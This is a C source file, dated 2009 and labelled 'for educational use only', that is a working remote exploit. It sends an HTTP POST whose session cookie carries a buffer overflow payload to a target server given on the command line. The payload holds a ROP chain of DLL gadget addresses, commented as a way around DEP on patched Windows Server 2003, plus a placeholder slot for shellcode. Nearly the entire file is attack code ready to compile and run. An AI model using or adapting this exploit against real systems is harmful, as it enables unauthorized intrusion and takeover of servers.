/*
    !!!FOR EDUCATIONAL USE ONLY!!!
     M.Yanagishita    Nov 2, 2009
    !!!FOR EDUCATIONAL USE ONLY!!!
*/
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

#define Die(a) if(a){return;}

char request[] = 
"POST / HTTP/1.1\r\nHost: %s\r\nCookie: killmenothing; SULang=de%%2CDE; themename=vista;"
" Session=_d838591b3a6257b0111138e6ca76c2c2409fb287b1473aa463db7f202caa09361bd7f8948c8d1adf4bd4f6c1c198eb9507545814%s\r\n"
"Content-Type: multipart/form-data; boundary=---------------------------25249352331758\r\nContent-Length: 0\r\n\r\n";

void main(int argc, char **argv)
{
	WSADATA wsaData;
	SOCKET s;
	struct hostent *he;
	struct sockaddr_in host;
	int len, sent, r;
	char *buf = new char[120000];
	char *payload = new char[100000];

	Die(argc<3);
	Die(WSAStartup(0x0101,&wsaData) != 0);
	Die((he = gethostbyname(argv[1])) == 0);

	host.sin_port = htons(atoi(argv[2]));
	host.sin_family = AF_INET;
	host.sin_addr = *((struct in_addr *)he->h_addr);

	Die((s = socket(2, 1, 6)) == -1);
	Die((connect(s, (struct sockaddr *) &host, sizeof(host))) == -1);
	
	
	memset(payload, 'C', 99999);
	memcpy(payload+(41000-62)*2+20, "4928b00f", 8); //add esp, 0x??? + ret

	//Bypass DEP in Win2k3 R2 SP2 Full Patched
	memcpy(payload +  0, "961ea378", 8);  //[mfc90u.dll]  pop esi + ret
	memcpy(payload +  8, "00020100", 8);  //esi <= 00010200 RW
	memcpy(payload + 16, "99aea478", 8);  //[mfc90u.dll]  push esp + pop ebp + ret 0c
	memcpy(payload + 24, "87e9a378", 8);  //[mfc90u.dll]  ret 20
	memcpy(payload + 32, "53c7b278", 8);  //[mfc90u.dll]  jmp esp
	memcpy(payload + 40, "47f5837c", 8);  //[ntdll.dll]   disable DEP, 0x7c98f547 for JP Win2k3

	//Shellcode here :>
	memcpy(payload+48, "ebfe", 4);

	payload[99999]=0;
	sprintf(buf, request, argv[1], payload);

	len = strlen(buf);
	sent = 0;
	r = send(s, buf, len, 0);
	sent += r;
	while(sent < len)
	{
		r = send(s, buf+sent, len-sent, 0);
		Die(r <= 0);
		sent += r;
	}
	closesocket(s);

}